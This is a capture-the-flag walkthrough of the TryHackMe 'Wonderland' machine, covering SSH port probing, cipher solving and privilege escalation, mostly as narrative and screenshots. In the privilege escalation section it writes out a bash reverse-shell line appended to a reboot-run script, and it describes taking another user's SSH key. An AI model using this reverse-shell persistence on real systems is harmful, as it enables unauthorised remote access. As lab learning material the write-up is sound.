# [THM-WALKTHROUGH] Wonderland

## *$ First Step : Enumeration*
I started to enumerate open ports with `nmap` but I was surprised seeing almost every port between 9000 and 13999 were running SSH. 

![image](https://user-images.githubusercontent.com/52162856/215579160-90b41c6d-c713-4b3a-861f-8b9cad7eee5e.png)

Then I started to process what to do and I came up with an idea. I wanted to create a script to see what they all give me as output but I firstly tried to make a connection to see what happens but I got this error. After few googlings I saw something that worked and solved the error.

![image](https://user-images.githubusercontent.com/52162856/215582546-430d4f5d-3558-48c2-b782-559bee84cc7b.png)

![image](https://user-images.githubusercontent.com/52162856/215582880-52d2d1b8-59cf-4109-b046-e79688917d21.png)

Added `HostkeyAlgorithms +ssh-rsa` in the file. And bingo ! 

![image](https://user-images.githubusercontent.com/52162856/215583146-d40b2d6d-7a5d-4c1d-ab5f-f73b02400775.png)

I tried with `alice` user because that seemed pretty adapted on the theme of the machine. The connection closed immediatly but something got me intrgued ... Why does it answer me 'Lower' ? So I wanted to know more about that and I tried with the highest port.

![image](https://user-images.githubusercontent.com/52162856/215583844-abca19d3-145b-46ea-a612-8d5a511da78f.png)

Now I see what to exploit in my script to guess what is the good port to look into. Let's it search for a while.

![image](https://user-images.githubusercontent.com/52162856/215592724-740c792d-adb6-455e-8ccb-c3199f0a4723.png)

This is the content of the script : 
```bash
#!/bin/bash

# Get only port numbers
ssh_port=`cat nmap_long.txt | grep unknown | cut -d '/' -f 1`
#echo $ssh_port

for i in $ssh_port 
do
                # -o permit to pass any option here : accept any new connection
                tmp=`ssh -o 'LogLevel=ERROR' -o 'StrictHostKeyChecking=accept-new' -p $i alicet@10.10.122.174`
                echo $i
                echo $tmp | grep -vE 'Lower|Higher'
done
```
In the grep options are `-v` which takes anything that doesn't contain a string and `-E` which allows to pass regex in parameters and here it has to not contain "Lower" or "Higher".

It stopped at 10428 and by the way I constructed the script I tried 10429 

![image](https://user-images.githubusercontent.com/52162856/215596689-dcdf6313-00ee-4834-a8d2-cad174028b3d.png)

Nice ! I found it ... after a HUGE time !

Firstly it looked like caesar cipher so I tried to know the letter frequency and because I know The Jabberwocky is written in english I could guess the key shift for
decrypting the poem

![image](https://user-images.githubusercontent.com/52162856/215598104-91ea0c62-c148-4e3c-baf8-e0f5ea2826e1.png)

We can see the most used letters are 'l' and 't' but the problem is there is only one most used letter in english so that's not the good way to see. Then I spotted the little single quote so I guess it was vigenere cipher so I tried to solve it while incrementing the keylengh according to the response

![image](https://user-images.githubusercontent.com/52162856/215600971-955893fa-357c-4aee-be0f-a5177f764841.png)

It seems that this response have the best score and it also has the first word of the original poem in the good place so it looks like the good anwser. Let's try it.

![image](https://user-images.githubusercontent.com/52162856/215600865-524782f3-ce9e-4252-b6a9-78bedb312880.png)

I firstly tried to put the key into the input asked but without success. Then I tried to put that key on the solver to get the full text to see if something was hidden inside and I hit right. The end of the poem is the secret to enter.

![Capture](https://user-images.githubusercontent.com/52162856/215602763-935daf0c-a0a8-4ba4-b959-c9409434162a.PNG)

There it is !

![Capture](https://user-images.githubusercontent.com/52162856/215603085-79ad618f-f681-4cce-ba3c-64df9e20537a.PNG)

There is the first flag ! Mybe a little trick will be necessary ;)

![Capture](https://user-images.githubusercontent.com/52162856/215605001-ca88ef9f-1214-476d-9a65-7544b90cfcf4.PNG)


## *$ Second Step : Privilege Escalation*

![image](https://user-images.githubusercontent.com/52162856/215605538-22adf120-d9bf-4325-b4c7-1d37f908ea0a.png)

We can see here that there is a possibility to reboot the system as root but no payload is about that on GTFOBins. We got no more chance with capbilities and sticky bits enumeration ... Neither to see other users directories

![image](https://user-images.githubusercontent.com/52162856/215606484-694c84e8-e2b8-4687-8844-7236f1797039.png)

Let's try to use an automated tool : `LinPEAS.sh`, a tool used to search automatically vectors of Linux PrivEsc.

Did not be able to resolve github.com so I put it on my machine and download it with wget.

![image](https://user-images.githubusercontent.com/52162856/215608373-dbd365fd-de3d-4765-980a-75a3fad460d7.png)

I seen something that seems interesting ...

![image](https://user-images.githubusercontent.com/52162856/215611043-83f96f32-8e35-4d8c-8f3e-a2f122a29feb.png)

Back to reality !
![image](https://user-images.githubusercontent.com/52162856/215610472-14f861e0-87b3-4634-96ab-b1e09490cb4c.png)

It seemed that the crontab has a SGID, like we saw it in the `sudo -l` command. Let's take a look
![image](https://user-images.githubusercontent.com/52162856/215611279-c696c517-4c73-4c2b-b2b5-b62bcb6ef797.png)

The script we saw in the working directory runs at reboot... Maybe a chance to get a shell ?

![image](https://user-images.githubusercontent.com/52162856/215611542-25e51c06-054f-4015-a207-1529777798a2.png)

I did `echo "bash -i >& /dev/tcp/10.18.70.69/53 0>&1" >> twasBrillig.sh` to put the reverse shell in the script and it worked after a `sudo reboot` and starting a nc on my machine.
We are now Tweedledum ! 
![image](https://user-images.githubusercontent.com/52162856/215614807-c84eaf46-d26f-4376-8a5c-b0766e5ef0af.png)

Let's see what he has.

![image](https://user-images.githubusercontent.com/52162856/215615844-be9cc868-4e93-4f43-b803-75b81d3ec9b2.png)

Maybe we can try to crack it. The `hash-identifier` says that is SHA-256.

![image](https://user-images.githubusercontent.com/52162856/215616417-e481dc7b-81cd-46d0-975d-ae1734407591.png)

Seems to be interesting but I don't get it yet. Tried an other tool to seem with there was only 7/8 that was founded and I saw that : 

![image](https://user-images.githubusercontent.com/52162856/215617408-aec8f892-1579-4803-b0dd-35bb04a2c170.png)

The last one is not found too. Maybe it's not even a SHA256.

We can execute a shell as his twin Tweedledee but that seemed to be useless:

![image](https://user-images.githubusercontent.com/52162856/215615279-5d3d1379-65c5-4bd7-807a-2dca79c437d6.png)

I tried those but without success and I found it was HEX. 

![image](https://user-images.githubusercontent.com/52162856/215617742-62393f65-841c-4841-9c51-6e494533d780.png)

![Capture](https://user-images.githubusercontent.com/52162856/215618057-99f693a0-9ba4-412d-8887-b96ee71381b4.PNG)

We have a password ! That's cool ... but for what ? Let's go back to the shell.

To take a look at anything I tried to enumerate an other time users, and then I found out that a user has the same username as the name of the file we just cracked.
So let's try.

![image](https://user-images.githubusercontent.com/52162856/215619521-2ecc6580-aac8-4cc4-95ce-86086016ee85.png)

It seems that even if the working directory of alice can't be listed, we still can go in and have access to the `.ssh` directory.

![image](https://user-images.githubusercontent.com/52162856/215620341-a781032f-871e-4a61-bcb6-1704345a465f.png)

Did some netact and there it is on my machine.

![image](https://user-images.githubusercontent.com/52162856/215620802-1a19eb85-b930-4a83-a8d2-8def4b840eba.png)

We are now alice ! 

![image](https://user-images.githubusercontent.com/52162856/215621224-a36f080a-b8f6-40bd-adf8-607e6f6a9cc3.png)

With a bit of search I've been able to find the there is a very nteresting thing in the sudoers.d directory.
![image](https://user-images.githubusercontent.com/52162856/215622765-7d61309d-d386-4019-a90a-9c4c38d54c94.png)

I had to see on the help menu of `sudo` how to sudo with on a host and this is `--host` 

![image](https://user-images.githubusercontent.com/52162856/215623262-d97764be-bff1-4b4c-9e70-3c0c510ad034.png)

Same trick as the first one !
![Capture](https://user-images.githubusercontent.com/52162856/215623690-d17ae40b-93ea-4087-b774-7764127074f2.PNG)

FINALLY !! I never thought I will be able to root this machine !! It was reaaally long ! but it was in fact so fun. I'm happy to ended it and happy that is was so much difficult than the first of the serie. 
